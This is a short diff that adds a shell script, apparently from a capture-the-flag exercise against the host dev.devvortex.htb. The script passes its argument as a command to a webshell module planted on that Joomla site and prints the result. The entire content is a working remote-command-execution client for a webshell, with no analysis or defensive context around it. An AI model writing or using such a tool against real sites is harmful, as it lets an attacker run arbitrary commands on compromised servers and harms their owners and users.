@@ -1,0 +1,3 @@
+#!/bin/sh
+
+echo -e `curl "http://dev.devvortex.htb//modules/mod_webshell/mod_webshell.php?action=exec&cmd=$(echo $1 | sed 's/ /%20/g')"`
